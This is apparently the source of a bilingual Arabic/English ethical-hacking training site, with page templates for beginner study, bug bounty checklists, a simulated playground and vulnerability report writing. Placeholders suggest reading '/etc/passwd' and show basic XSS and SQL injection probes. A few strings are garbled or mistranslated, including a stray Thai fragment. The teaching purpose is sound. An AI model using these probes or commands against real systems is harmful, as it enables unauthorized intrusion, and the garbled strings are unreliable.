        </div>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-warning text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-book"></i> ${txt('الكتب والمراجع', 'Books & References')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-danger"></i> The Web Application Hacker's Handbook</h6>
                <p class="card-text small text-muted">${txt('دليل شامل لتطوير مهارات الهندسة الأخلاقية للأطراف الأمامية للتطبيقات الويب', 'Comprehensive guide to developing ethical hacking skills for web application front-ends')}</p>
                <a href="The_Web_Application_Hacker_s_Handbook.pdf" target="_blank" class="btn btn-sm btn-outline-danger">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
          
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-primary"></i> The Hacker Playbook</h6>
                <p class="card-text small text-muted">${txt('كتاب شامل لإتقان مهارات الهندسة الأخلاقية', 'Comprehensive book for mastering ethical hacking skills')}</p>
                <a href="The_Hacker_Playbook.pdf" target="_blank" class="btn btn-sm btn-outline-primary">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-info text-white">
            <h5 class="mb-0"><i class="fa-solid fa-toolbox"></i> ${txt('الأدوات الأساسية', 'Essential Tools')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li><strong>Burp Suite:</strong> ${txt('للفحص والاستغلال', 'For scanning and exploitation')}</li>
              <li><strong>OWASP ZAP:</strong> ${txt('أداة فحص مفتوحة المصدر', 'Open-source scanning tool')}</li>
              <li><strong>Subfinder/Amass:</strong> ${txt('لاستخراج الدومينات الفرعية', 'For subdomain enumeration')}</li>
              <li><strong>FFUF/Gobuster:</strong> ${txt('لاكتشاف المحتوى', 'For content discovery')}</li>
              <li><strong>Nuclei:</strong> ${txt('لفحص الثغرات تلقائيًا', 'For automated vulnerability scanning')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-danger text-white">
            <h5 class="mb-0"><i class="fa-solid fa-lightbulb"></i> ${txt('نصائح للنجاح', 'Success Tips')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('ابدأ بالمهارات الأساسية ثم انتقل إلى المتقدمة', 'Start with basic skills then move to advanced')}</li>
              <li>${txt('ركز على نوع هجوم واحد في البداية', 'Focus on one attack type initially')}</li>
              <li>${txt('وثق كل شيء في تقارير واضحة', 'Document everything in clear reports')}</li>
              <li>${txt('تعلم من التقارير المنشورة', 'Learn from disclosed reports')}</li>
              <li>${txt('كن صبورًا ومثابرًا', 'Be patient and persistent')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div > `;
}
*/

function pageEwpt() {
  return `
    < div class="container mt-4" >
    <h2><i class="fa-solid fa-graduation-cap"></i> ${txt('هندسة حاسوب الأخلاقية (الأبتدائي)', 'Beginner Ethical Hacking')}</h2>
    <div class="alert alert-info">
      <i class="fa-solid fa-circle-info"></i> ${txt('دليل شامل لتعلم هندسة حاسوب الأخلاقية للأبتدائيين وإتقان مهاراتك في هذا المجال',
    'Comprehensive guide to learn beginner ethical hacking and master your skills in this field')}
    </div>

    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-primary text-white">
            <h5 class="mb-0"><i class="fa-solid fa-book-open"></i> ${txt('البدء في هندسة حاسوب الأخلاقية للأبتدائيين', 'Getting Started with Beginner Ethical Hacking')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('فهم أسس أمن المعلومات', 'Understanding information security fundamentals')}</li>
              <li>${txt('تعلم البرمجة', 'Learning programming')}</li>
              <li>${txt('ทำความ مألوفاً بالأنظمة التشغيلية', 'Getting familiar with operating systems')}</li>
              <li>${txt('تعلم شبكات الكمبيوتر', 'Learning computer networks')}</li>
              <li>${txt('فهم أنواع الهجمات الشائعة', 'Understanding common attack types')}</li>
              <li>${txt('تعلم كيفية مواجهة الهجمات', 'Learning how to defend against attacks')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-bullseye"></i> ${txt('الموارد المتاحة', 'Available Resources')}</h5>
          </div>
          <div class="card-body">
            <div class="d-grid gap-2">
              <a href="https://www.offensive-security.com/pwk-oscp/" target="_blank" class="btn btn-outline-primary">
                <i class="fa-solid fa-shield-halved"></i> Offensive Security OSCP
              </a>
              <a href="https://www.certifiedhacker.com/" target="_blank" class="btn btn-outline-success">
                <i class="fa-solid fa-shield"></i> Certified Ethical Hacker
              </a>
              <a href="https://www.ejpt.com/" target="_blank" class="btn btn-outline-warning">
                <i class="fa-solid fa-shield-halved"></i> EC-Council EJPT
              </a>
              <a href="https://www.eccouncil.org/certified-ethical-hacker/" target="_blank" class="btn btn-outline-info">
                <i class="fa-solid fa-shield"></i> EC-Council Certified Ethical Hacker
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-warning text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-book"></i> ${txt('الكتب والمراجع', 'Books & References')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-danger"></i> The Web Application Hacker's Handbook</h6>
                <p class="card-text small text-muted">${txt('دليل شامل لتطوير مهارات الهندسة الأخلاقية للأطراف الأمامية للتطبيقات الويب', 'Comprehensive guide to developing ethical hacking skills for web application front-ends')}</p>
                <a href="The_Web_Application_Hacker_s_Handbook.pdf" target="_blank" class="btn btn-sm btn-outline-danger">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
          
          <div class="col-md-6">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="card-title"><i class="fa-solid fa-file-pdf text-primary"></i> The Hacker Playbook</h6>
                <p class="card-text small text-muted">${txt('كتاب شامل لإتقان مهارات الهندسة الأخلاقية', 'Comprehensive book for mastering ethical hacking skills')}</p>
                <a href="The_Hacker_Playbook.pdf" target="_blank" class="btn btn-sm btn-outline-primary">
                  <i class="fa-solid fa-download"></i> ${txt('تحميل PDF', 'Download PDF')}
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-info text-white">
            <h5 class="mb-0"><i class="fa-solid fa-toolbox"></i> ${txt('الأدوات الأساسية', 'Essential Tools')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li><strong>Burp Suite:</strong> ${txt('للفحص والاستغلال', 'For scanning and exploitation')}</li>
              <li><strong>OWASP ZAP:</strong> ${txt('أداة فحص مفتوحة المصدر', 'Open-source scanning tool')}</li>
              <li><strong>Subfinder/Amass:</strong> ${txt('لاستخراج الدومينات الفرعية', 'For subdomain enumeration')}</li>
              <li><strong>FFUF/Gobuster:</strong> ${txt('لاكتشاف المحتوى', 'For content discovery')}</li>
              <li><strong>Nuclei:</strong> ${txt('لفحص الثغرات تلقائيًا', 'For automated vulnerability scanning')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-danger text-white">
            <h5 class="mb-0"><i class="fa-solid fa-lightbulb"></i> ${txt('نصائح للنجاح', 'Success Tips')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('ابدأ بالمهارات الأساسية ثم انتقل إلى المتقدمة', 'Start with basic skills then move to advanced')}</li>
              <li>${txt('ركز على نوع هجوم واحد في البداية', 'Focus on one attack type initially')}</li>
              <li>${txt('وثق كل شيء في تقارير واضحة', 'Document everything in clear reports')}</li>
              <li>${txt('تعلم من التقارير المنشورة', 'Learn from disclosed reports')}</li>
              <li>${txt('كن صبورًا ومثابرًا', 'Be patient and persistent')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div > `;
}

function pageBugBounty() {
  return `
    < div class="container mt-4" >
      <h2><i class="fa-solid fa-bug"></i> ${txt('Bug Bounty', 'Bug Bounty')}</h2>
      
      <ul class="nav nav-tabs mb-4" id="bbTabs" role="tablist">
        <li class="nav-item" role="presentation">
          <button class="nav-link active" id="bb-guide-tab" data-bs-toggle="tab" data-bs-target="#bb-guide" type="button" role="tab"><i class="fa-solid fa-book"></i> ${txt('الدليل', 'Guide')}</button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="bb-checklist-tab" data-bs-toggle="tab" data-bs-target="#bb-checklist" type="button" role="tab"><i class="fa-solid fa-list-check"></i> ${txt('قائمة الصيد', 'Hunting Checklist')}</button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="bb-report-tab" data-bs-toggle="tab" data-bs-target="#bb-report" type="button" role="tab"><i class="fa-solid fa-file-pen"></i> ${txt('منشئ التقارير', 'Report Builder')}</button>
        </li>
      </ul>

      <div class="tab-content">
        <!-- Guide Tab -->
        <div class="tab-pane fade show active" id="bb-guide" role="tabpanel">
          <div class="alert alert-info">
            <i class="fa-solid fa-circle-info"></i> ${txt('دليل شامل لتعلم Bug Bounty والبدء في إيجاد الثغرات والتقديم على البرامج', 'Comprehensive guide to learn Bug Bounty and start finding vulnerabilities and submitting to programs')}
          </div>
          
          <div class="row g-4 mb-4">
            <div class="col-md-6">
              <div class="card h-100">
                <div class="card-header bg-primary text-white">
                  <h5 class="mb-0"><i class="fa-solid fa-graduation-cap"></i> ${txt('البدء في Bug Bounty', 'Getting Started with Bug Bounty')}</h5>
                </div>
                <div class="card-body">
                  <ul>
                    <li>${txt('فهم أساسيات أمن تطبيقات الويب', 'Understanding web application security fundamentals')}</li>
                    <li>${txt('تعلم OWASP Top 10', 'Learning OWASP Top 10')}</li>
                    <li>${txt('ممارسة على المختبرات الآمنة', 'Practicing on safe labs')}</li>
                    <li>${txt('فهم أنواع الثغرات الشائعة', 'Understanding common vulnerability types')}</li>
                    <li>${txt('تعلم كيفية كتابة التقارير', 'Learning how to write reports')}</li>
                  </ul>
                </div>
              </div>
            </div>
            
            <div class="col-md-6">
              <div class="card h-100">
                <div class="card-header bg-success text-white">
                  <h5 class="mb-0"><i class="fa-solid fa-bullseye"></i> ${txt('المنصات والبرامج', 'Platforms & Programs')}</h5>
                </div>
                <div class="card-body">
                  <div class="d-grid gap-2">
                    <a href="https://www.hackerone.com/" target="_blank" class="btn btn-outline-primary">
                      <i class="fa-brands fa-hacker-news"></i> HackerOne
                    </a>
                    <a href="https://www.bugcrowd.com/" target="_blank" class="btn btn-outline-success">
                      <i class="fa-solid fa-crow"></i> Bugcrowd
                    </a>
                    <a href="https://www.synack.com/" target="_blank" class="btn btn-outline-warning">
                      <i class="fa-solid fa-shield-halved"></i> Synack
                    </a>
                    <a href="https://www.intigriti.com/" target="_blank" class="btn btn-outline-info">
                      <i class="fa-solid fa-shield"></i> Intigriti
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Hunting Checklist Tab -->
        <div class="tab-pane fade" id="bb-checklist" role="tabpanel">
          <div class="card shadow-sm">
            <div class="card-header bg-dark text-white">
              <h5 class="mb-0"><i class="fa-solid fa-clipboard-check"></i> ${txt('قائمة التحقق للصيد', 'Hunting Checklist')}</h5>
            </div>
            <div class="card-body">
              <div class="progress mb-4" style="height: 25px;">
                <div id="bb-progress" class="progress-bar bg-warning progress-bar-striped progress-bar-animated text-dark" role="progressbar" style="width: 0%">0%</div>
              </div>
              
              <div class="list-group">
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c1" onchange="toggleChecklist('bb-c1')">
                  <strong>Reconnaissance:</strong> Subdomain enumeration & Tech stack identification
                </label>
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c2" onchange="toggleChecklist('bb-c2')">
                  <strong>Content Discovery:</strong> Fuzzing for directories, files, and API endpoints
                </label>
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c3" onchange="toggleChecklist('bb-c3')">
                  <strong>Authentication:</strong> Test for Weak passwords, No rate limiting, Logic flaws
                </label>
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c4" onchange="toggleChecklist('bb-c4')">
                  <strong>Authorization:</strong> IDOR, Privilege Escalation (Vertical/Horizontal)
                </label>
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c5" onchange="toggleChecklist('bb-c5')">
                  <strong>Input Validation:</strong> XSS, SQLi, Command Injection, SSRF
                </label>
                <label class="list-group-item">
                  <input class="form-check-input me-1" type="checkbox" id="bb-c6" onchange="toggleChecklist('bb-c6')">
                  <strong>Business Logic:</strong> Payment bypass, Coupon abuse, Workflow bypass
                </label>
              </div>
            </div>
          </div>
        </div>

        <!-- Report Builder Tab -->
        <div class="tab-pane fade" id="bb-report" role="tabpanel">
          <div class="card shadow-sm">
            <div class="card-header bg-secondary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-file-pen"></i> ${txt('منشئ التقارير', 'Report Builder')}</h5>
            </div>
            <div class="card-body">
              <div class="mb-3">
                <label class="form-label fw-bold">${txt('اختر القالب', 'Select Template')}</label>
                <div class="btn-group w-100" role="group">
                  <button class="btn btn-outline-secondary" onclick="loadTemplate('bugbounty')">Bug Bounty</button>
                  <button class="btn btn-outline-secondary" onclick="loadTemplate('pentest')">Pentest</button>
                  <button class="btn btn-outline-secondary" onclick="loadTemplate('disclosure')">Disclosure</button>
                  <button class="btn btn-outline-secondary" onclick="loadTemplate('cvss')">CVSS</button>
                </div>
              </div>
              
              <div class="mb-3">
                <label class="form-label fw-bold">${txt('محرر التقرير (Markdown)', 'Report Editor (Markdown)')}</label>
                <textarea id="report-md" class="form-control" rows="15" placeholder="# Report Title..."></textarea>
              </div>
              
              <div class="d-flex gap-2">
                <button class="btn btn-primary" onclick="copyReport()">
                  <i class="fa-solid fa-copy"></i> ${txt('نسخ Markdown', 'Copy Markdown')}
                </button>
                <button class="btn btn-success" onclick="exportReportHTML()">
                  <i class="fa-solid fa-file-export"></i> ${txt('تصدير HTML', 'Export HTML')}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div > `;
}

/* ========== إذا أردت استيرادها كـ Node module ========== */
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    pageOverview, pageRecon, pageScan, pageVulns, pageExploit,
    pagePost, pageReport, pageLabs, pageTools, pagePayloads, pageNotes,
    pagePlayground, pageEjpt, pageEwpt, pageBugBounty
  };
}

/* ========== إذا أردت استيرادها كـ Node module ========== */
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    pageOverview, pageRecon, pageScan, pageVulns, pageExploit,
    pagePost, pageReport, pageLabs, pageTools, pagePayloads, pageNotes,
    pagePlayground, pageEjpt, pageEwpt, pageBugBounty
  };
}

/* DUPLICATE pagePlayground REMOVED - Using complete version at line 5423
function pagePlayground_DUPLICATE() {
  setTimeout(() => {
    // Initialize playground specific logic if needed
  }, 500);

  return `
    <div class="container-fluid mt-4">
      ... DUPLICATE CONTENT REMOVED FOR BREVITY ...
    </div>`;
}
END OF DUPLICATE */

/*
        <div class="col-12 text-center">
            <h2 class="display-5 fw-bold mb-3"><i class="fa-solid fa-gamepad text-primary"></i> ${txt('ساحة التجربة', 'Playground')}</h2>
            <p class="lead text-muted">${txt('جرب الأكواد والأوامر في بيئة آمنة ومحاكية.', 'Test codes and commands in a safe simulated environment.')}</p>
        </div>
      </div>
    
    <div class="alert alert-warning shadow-sm border-start border-warning border-5">
      <div class="d-flex align-items-center">
        <i class="fa-solid fa-triangle-exclamation fa-2x me-3"></i>
        <div>
            <strong>${txt('تنبيه أمني', 'Security Alert')}</strong><br>
            ${txt('هذه البيئة محاكية بالكامل في متصفحك. لا تستخدم أكواد خبيثة حقيقية.', 'This environment is fully simulated in your browser. Do not use real malicious code.')}
        </div>
      </div>
    </div>
    
    <div class="row g-4 mt-2">
      <!-- Command Lab -->
      <div class="col-md-6">
        <div class="card h-100 shadow-sm">
          <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
            <h5 class="mb-0"><i class="fa-solid fa-terminal me-2"></i> ${txt('مختبر الأوامر (Simulated Terminal)', 'Command Lab')}</h5>
            <span class="badge bg-secondary">BASH</span>
          </div>
          <div class="card-body bg-light">
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('الأمر (Command)', 'Command')}</label>
              <div class="input-group">
                <span class="input-group-text bg-dark text-white border-0">$</span>
                <input type="text" class="form-control font-monospace" id="cmd-input" placeholder="whoami, ls, cat /etc/passwd">
              </div>
            </div>
            <button class="btn btn-dark w-100" onclick="executeCommand()">
              <i class="fa-solid fa-play me-2"></i> ${txt('تنفيذ', 'Execute')}
            </button>
            <div class="mt-4">
              <label class="form-label fw-bold text-muted small">${txt('المخرجات', 'Output')}</label>
              <pre id="cmd-output" class="bg-black text-success p-3 rounded font-monospace" style="min-height: 150px; border: 1px solid #333;">_ cursor waiting...</pre>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Payload Testing -->
      <div class="col-md-6">
        <div class="card h-100 shadow-sm">
          <div class="card-header bg-danger text-white">
            <h5 class="mb-0"><i class="fa-solid fa-bug me-2"></i> ${txt('اختبار الثغرات (XSS/SQLi)', 'Payload Testing')}</h5>
          </div>
          <div class="card-body">
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('مدخل الـ Payload', 'Payload Input')}</label>
              <textarea class="form-control font-monospace" id="payload-input" rows="3" placeholder="<script>alert(1)</script> OR ' OR 1=1--"></textarea>
            </div>
            <div class="mb-3">
              <label class="form-label fw-bold">${txt('سياق الحقن', 'Injection Context')}</label>
              <select class="form-select" id="injection-context">
                <option value="html">HTML Body (Reflection)</option>
                <option value="attr">Attribute (value="USER_INPUT")</option>
                <option value="sql">SQL Query (SELECT * FROM users...)</option>
              </select>
            </div>
            <button class="btn btn-danger w-100" onclick="testPayload()">
              <i class="fa-solid fa-bomb me-2"></i> ${txt('اختبار الثغرة', 'Test Vulnerability')}
            </button>
            <div id="payload-result" class="mt-3 p-3 rounded" style="display:none;"></div>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Quick Tools -->
    <div class="card mt-5 shadow-sm">
      <div class="card-header bg-info text-white">
        <h5 class="mb-0"><i class="fa-solid fa-toolbox me-2"></i> ${txt('أدوات مساعدة سريعة', 'Quick Helper Tools')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-4">
            <button class="btn btn-outline-primary w-100 py-3" onclick="loadTool('encoder')">
              <i class="fa-solid fa-code fa-2x mb-2 d-block"></i> ${txt('Base64/URL', 'Encoder/Decoder')}
            </button>
          </div>
          <div class="col-md-4">
            <button class="btn btn-outline-success w-100 py-3" onclick="loadTool('hash')">
              <i class="fa-solid fa-hashtag fa-2x mb-2 d-block"></i> ${txt('تحليل الهاش', 'Hash Analyzer')}
            </button>
          </div>
          <div class="col-md-4">
            <button class="btn btn-outline-info w-100 py-3" onclick="loadTool('http')">
              <i class="fa-solid fa-globe fa-2x mb-2 d-block"></i> ${txt('فاحص الرؤوس', 'Header Inspector')}
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>`;
}

/*
function pagePlayground_OLD() {
  return `
    < div class="container mt-4" >
    <h2>${txt('ساحة التجربة', 'Playground')}</h2>
    
    <div class="alert alert-warning">
      <i class="fa-solid fa-triangle-exclamation"></i> ${txt('تحذير: استخدم هذه الأدوات في بيئة محلية آمنة فقط', 'Warning: Only use these tools in a safe local environment')}
    </div>
    
    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-primary text-white">
            <h5 class="mb-0"><i class="fa-solid fa-terminal"></i> ${txt('مختبر الأوامر', 'Command Lab')}</h5>
          </div>
          <div class="card-body">
            <div class="mb-3">
              <label class="form-label">${txt('تنفيذ الأمر', 'Execute Command')}</label>
              <input type="text" class="form-control" id="cmd-input" placeholder="e.g., whoami, ls -la">
            </div>
            <button class="btn btn-primary" onclick="executeCommand()">
              <i class="fa-solid fa-play"></i> ${txt('تنفيذ', 'Run')}
            </button>
            <div class="mt-3">
              <pre id="cmd-output" class="bg-dark text-light p-3" style="min-height: 100px;"></pre>
            </div>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-code"></i> ${txt('اختبار الـ Payloads', 'Payload Testing')}</h5>
          </div>
          <div class="card-body">
            <div class="mb-3">
              <label class="form-label">${txt('الـ Payload', 'Payload')}</label>
              <textarea class="form-control" id="payload-input" rows="3" placeholder="e.g., <script>alert(1)</script>"></textarea>
            </div>
            <div class="mb-3">
              <label class="form-label">${txt('النتيجة المتوقعة', 'Expected Result')}</label>
              <input type="text" class="form-control" id="expected-result" placeholder="e.g., XSS executed">
            </div>
            <button class="btn btn-success" onclick="testPayload()">
              <i class="fa-solid fa-vial"></i> ${txt('اختبار', 'Test')}
            </button>
          </div>
        </div>
      </div>
    </div>
    
    <div class="card mt-4">
      <div class="card-header bg-warning text-dark">
        <h5 class="mb-0"><i class="fa-solid fa-flask"></i> ${txt('أدوات التجربة', 'Testing Tools')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-4">
            <button class="btn btn-outline-primary w-100" onclick="loadTool('encoder')">
              <i class="fa-solid fa-code"></i> ${txt('تشفير/فك تشفير', 'Encoder/Decoder')}
            </button>
          </div>
          <div class="col-md-4">
            <button class="btn btn-outline-success w-100" onclick="loadTool('hash')">
              <i class="fa-solid fa-hashtag"></i> ${txt('حاسبة الهاش', 'Hash Calculator')}
            </button>
          </div>
          <div class="col-md-4">
            <button class="btn btn-outline-info w-100" onclick="loadTool('http')">
              <i class="fa-solid fa-globe"></i> ${txt('مختبر HTTP', 'HTTP Lab')}
            </button>
          </div>
        </div>
      </div>
    </div>
  </div > `;
}
*/

function pageReport() {
  return `
    <div class="container-fluid mt-4">
    <h2><i class="fa-solid fa-file-contract"></i> ${txt('الإبلاغ والإفصاح', 'Reporting & Disclosure')}</h2>

    <div class="alert alert-info">
      <i class="fa-solid fa-circle-info"></i> ${txt('اختر قالباً أو ابدأ من الصفر', 'Choose a template or start from scratch')}
    </div>

    <div class="row g-3 mb-3">
      <div class="col-md-3">
        <button class="btn btn-outline-primary w-100" onclick="loadTemplate('bugbounty')">
          <i class="fa-solid fa-bug"></i> Bug Bounty
        </button>
      </div>
      <div class="col-md-3">
        <button class="btn btn-outline-success w-100" onclick="loadTemplate('pentest')">
          <i class="fa-solid fa-shield"></i> Pentest
        </button>
      </div>
      <div class="col-md-3">
        <button class="btn btn-outline-warning w-100" onclick="loadTemplate('disclosure')">
          <i class="fa-solid fa-envelope"></i> Disclosure
        </button>
      </div>
      <div class="col-md-3">
        <button class="btn btn-outline-danger w-100" onclick="loadTemplate('cvss')">
          <i class="fa-solid fa-chart-line"></i> CVSS
        </button>
      </div>
    </div>

    <textarea id="report-md" rows="20" class="form-control mb-3" placeholder="${txt('اكتب تقريرك هنا...', 'Write your report here...')}">
## ${txt('عنوان الثغرة', 'Vulnerability Title')}
${txt('الجنسية', 'Category')}: XSS (Reflected)

## ${txt('الوصف المختصر', 'Summary')}
...

## ${txt('خطوات الإعادة', 'Reproduction Steps')}
1. ...
2. ...

## ${txt('الدليل', 'Evidence')}
Screenshot + HTTP Request

## ${txt('الاقتراح', 'Remediation')}
${txt('قم بتعقيم المدخلات', 'Sanitize user inputs')}

## ${txt('الأثر', 'Impact')}
${txt('تنفيذ سكربتات في سياق المستخدم', 'Execute scripts in user context')}
    </textarea>

    <div class="btn-group mb-4" role="group">
      <button class="btn btn-primary" onclick="exportMarkdown()">
        <i class="fa-solid fa-download"></i> ${txt('تصدير Markdown', 'Export Markdown')}
      </button>
      <button class="btn btn-success" onclick="exportReportHTML()">
        <i class="fa-brands fa-html5"></i> ${txt('تصدير HTML', 'Export HTML')}
      </button>
      <button class="btn btn-warning" onclick="exportPDF('report')">
        <i class="fa-solid fa-file-pdf"></i> ${txt('تصدير PDF', 'Export PDF')}
      </button>
      <button class="btn btn-secondary" onclick="copyReport()">
        <i class="fa-solid fa-copy"></i> ${txt('نسخ', 'Copy')}
      </button>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-primary text-white">
        <h5 class="mb-0"><i class="fa-solid fa-calculator"></i> ${txt('حاسبة CVSS', 'CVSS Calculator')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-6">
            <label class="form-label fw-bold">${txt('نوع الثغرة', 'Vulnerability Type')}</label>
            <select class="form-select" id="cvss-type">
              <option value="xss">Cross-Site Scripting (XSS)</option>
              <option value="sqli">SQL Injection</option>
              <option value="rce">Remote Code Execution (RCE)</option>
              <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
              <option value="idor">Insecure Direct Object Reference (IDOR)</option>
              <option value="lfi">Local File Inclusion (LFI)</option>
              <option value="csrf">Cross-Site Request Forgery (CSRF)</option>
              <option value="auth">Authentication Bypass</option>
            </select>
          </div>
          <div class="col-md-6">
            <label class="form-label fw-bold">${txt('الخطورة', 'Severity')}</label>
            <select class="form-select" id="cvss-severity">
              <option value="critical">Critical (9.0-10.0)</option>
              <option value="high">High (7.0-8.9)</option>
              <option value="medium">Medium (4.0-6.9)</option>
              <option value="low">Low (0.1-3.9)</option>
            </select>
          </div>
        </div>
        <div class="alert alert-secondary mt-3 small">
          <strong>${txt('نصيحة:', 'Tip:')}</strong> ${txt('للحساب الدقيق، استخدم', 'For accurate calculation, use')} 
          <a href="https://www.first.org/cvss/calculator/3.1" target="_blank">CVSS v3.1 Calculator</a>
        </div>
      </div>
    </div>

    <div class="row g-3">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-shield-halved"></i> ${txt('الإفصاح المسؤول', 'Responsible Disclosure')}</h5>
          </div>
          <div class="card-body">
            <h6 class="fw-bold text-success">${txt('يجب عمله', 'Do\'s')}</h6>
            <ul class="small">
              <li>✅ ${txt('اتبع سياسة الإفصاح المنشورة', 'Follow published disclosure policy')}</li>
              <li>✅ ${txt('قدم تقريراً واضحاً ومفصلاً', 'Provide clear and detailed report')}</li>
              <li>✅ ${txt('أعطهم وقتاً معقولاً للإصلاح (90 يوم)', 'Give reasonable time to fix (90 days)')}</li>
              <li>✅ ${txt('تواصل باحترافية ولباقة', 'Communicate professionally')}</li>
              <li>✅ ${txt('احترم خصوصية البيانات', 'Respect data privacy')}</li>
            </ul>

            <h6 class="fw-bold text-danger mt-3">${txt('يجب تجنبه', 'Don\'ts')}</h6>
            <ul class="small">
              <li>❌ ${txt('لا تنشر علنياً قبل الإصلاح', 'Don\'t disclose publicly before fix')}</li>
              <li>❌ ${txt('لا تختبر في الإنتاج بدون إذن', 'Don\'t test on production without permission')}</li>
              <li>❌ ${txt('لا تحمل بيانات حقيقية', 'Don\'t download real user data')}</li>
              <li>❌ ${txt('لا تدمر أو تعطل الخدمة', 'Don\'t damage or disrupt the service')}</li>
              <li>❌ ${txt('لا تبتز للحصول على مكافأة', 'Don\'t extort for bounty')}</li>
            </ul>
          </div>
        </div>
      </div>

      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-warning text-dark">
            <h5 class="mb-0"><i class="fa-solid fa-book"></i> ${txt('مصادر مفيدة', 'Useful Resources')}</h5>
          </div>
          <div class="card-body">
            <h6 class="fw-bold">${txt('إرشادات', 'Guidelines')}</h6>
            <ul class="small">
              <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html" target="_blank">OWASP Disclosure Guidelines</a></li>
              <li><a href="https://www.bugcrowd.com/resources/glossary/responsible-disclosure/" target="_blank">Bugcrowd Responsible Disclosure</a></li>
              <li><a href="https://www.hackerone.com/disclosure-guidelines" target="_blank">HackerOne Disclosure</a></li>
            </ul>

            <h6 class="fw-bold mt-3">${txt('أدوات للكتابة', 'Writing Tools')}</h6>
            <ul class="small">
              <li><a href="https://dillinger.io/" target="_blank">Dillinger</a> - ${txt('محرر Markdown أونلاين', 'Online Markdown editor')}</li>
              <li><a href="https://www.grammarly.com/" target="_blank">Grammarly</a> - ${txt('تدقيق لغوي', 'Grammar checker')}</li>
              <li><a href="https://hemingwayapp.com/" target="_blank">Hemingway Editor</a> - ${txt('تحسين الوضوح', 'Improve clarity')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="card mt-4">
      <div class="card-header bg-info text-white">
        <h5 class="mb-0"><i class="fa-solid fa-trophy"></i> ${txt('منصات Bug Bounty', 'Bug Bounty Platforms')}</h5>
      </div>
      <div class="card-body">
        <div class="row g-3">
          <div class="col-md-4">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="fw-bold">HackerOne</h6>
                <p class="small text-muted">${txt('أكبر منصة للباگ باونتي في العالم', 'Largest bug bounty platform')}</p>
                <a href="https://www.hackerone.com/" target="_blank" class="btn btn-sm btn-outline-primary w-100">
                  <i class="fa-solid fa-link"></i> ${txt('زيارة', 'Visit')}
                </a>
              </div>
            </div>
          </div>
          <div class="col-md-4">
            <div class="card h-100">
              <div class="card-body">
                <h6 class="fw-bold">Bugcrowd</h6>
